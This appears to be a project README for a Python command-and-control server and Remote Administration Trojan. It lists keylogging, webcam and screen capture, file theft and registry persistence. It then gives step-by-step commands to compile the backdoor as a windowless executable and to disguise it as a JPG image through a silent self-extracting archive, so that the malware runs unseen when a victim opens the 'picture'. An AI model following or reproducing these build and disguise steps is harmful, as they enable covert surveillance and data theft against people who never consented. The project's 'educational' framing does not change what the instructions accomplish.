# C2KepExec

**C2KepExec** is a Command and Control (C2) server which can control multiple machines running the Remote Administration Trojan (RAT) forming a botnet cluster which was written in Python3, C++, and C. 

**C2KepExec** was developed for **educational** purposes and continues to be developed as such!


## Features

- Integrated keylogger written as a class
  - Can be started and stopped remotely
  - With options to _dump_ or _overwrite_ the log file
- Check privilege level (Administrator/User)
- Spawn other programs
- Download files from target
- Download files from specified URL
- Upload files to target
- C2 allows control of multiple target sessions
- Issue a _sendall *command*_ to every active session
- Persistence by creating a registry entry (Windows)
- Conceals infection by writing files in AppData (Windows)

- Screenshot of the target's screen which is sent to server
- Webcam capture
- Remote shutdown of the backdoor _(executable is NOT safely removed)_

    ===Windows Only===
    persistence *RegName* *filename*    --> Create Persistence In Registry
                                            copies backdoor to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    check                               --> Check If Has Administrator Privileges

## Dependencies

The C2 server has no _external dependencies_ as of _v0.9.2-alpha_.

The backdoor relies on the following as of v0.10.1-alpha:

    pip install mss \
                pynput \
                requests

 - **MSS** is required for the `screenshot()` function.
 - **Pynput** is required for the `Keylogger` class.
 - **Requests** is required for the `download_url()` function.


The below mentioned steps are for compiling the backdoor for deployment. 
For those wishing to test the C2 server and backdoor interaction see [issue 1](https://github.com/pxcs/C2KepExec/issues/1#issuecomment-1210378473).

## Wine and Pyinstaller (Win version) Installation on Linux


Python 2.7.14 Releases [here](https://www.python.org/downloads/release/python-2714/)

## Environment Setup

┌──(root@kali)-[~/]

└─# 

    sudo su
    dpkg --add-architecture i386
    apt update
    apt install wine32 
    wget https://www.python.org/ftp/python/2.7.14/python-2.7.14.msi
    sudo wine msiexec -i ~/python-2.7.14.msi #x86 arch
    
    
## Installing Dependencies

┌──(root@kali)-[~]

└─# 

    cd /root/.wine/drive_c/Python27
    wine python.exe -m pip install  pyinstaller \
                                    requests \ 
                                    mss \
				    pynput


## Backdoor Compilation and Obfuscation for Windows

## Compile to Executable using Pyinstaller Linux

    $ pyinstaller --onefile --noconsole backdoor.py

or,

## Compile to Executable using Pyinstaller (Win) under Wine

┌──(root@kali)-[~]

└─#

	wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole ~/backdoor.py
    
**alternatively** if an _icon_ has already been created,
    
	wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon ~/malware_128x128.ico ~/backdoor.py
    
This will produce _./dist/backdoor.exe_


## Obfuscation using SFX Archive (Theory)

The executable _backdoor.exe_ will be made to look like an image (jpg) file.
By default, Windows does not show file extensions (e.g. backdoor.exe will show in Windows Explorer as backdoor).
Hence, we will create an SFX archive name _wallpaper.jpg.exe_ which Windows Explorer will show as _wallpaper.jpg_.

This will involve having an _image_ which we will also create an icon version of _.ico_ to assign the SFX archive.
Making the executable appear to be an image.

Of course, this same method could be applied to audio, document or video file using an appropriate icon.

### NOTE: SFX Archive

SFX archive is not the only method of obfuscating the executable.
We can when compiling using _Pyinstaller_ add the argument _--add-data "/root/wallpaper.jpg;."_ with
_--icon ~/wallpaper.ico_.

┌──(root@kali)-[~]

└─#

    wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --add-data "/root/wallpaper.jpg;." --icon ~/malware_128x128.ico ~/backdoor.py
    mv ./dist/_backdoor.exe_ ./dist/_wallpaper.jpg.exe_


## Creating SFX Archive

WinRAR > Add To Archive (image.jpg and backdoor.exe)

Rename archive to: _image.jpg.exe_


- Add to SFX Archive (Y) and Advanced>

    **Setup>Run after extraction**
    
		California-HD-Background.jpg
		backdoor.exe

	**Modes**
		Unpack to temporary folder
		Silent mode
			Hide all

	**Update**
		Update mode>
			Extract and update files
		Overwrite mode>
			Overwrite all files
			
	**Text and icon**
		Load SFX icon from the file (image ICO)



## Creating SFX Archive - Visual

This will produce an SFX archive which looks like an image

While inspecting the file will reveal it is an executable the file extension _.exe_ is concealed.
Furthermore, if viewed from the Desktop the file cannot be differentiated from a 'real' image.

![image8](https://user-images.githubusercontent.com/10171446/153618884-601e9a7f-9bda-4fd5-a5a0-9808053160c5.PNG)



Once opened the SFX archive will open the image file inside the archive and the malware will execute after.

Due to _--noconsole_ argument in _Pyinstaller_, no window will be rendered.


## Task Manager

The _backdoor.exe_ process can be seen in Task Manager and ended there if necessary.
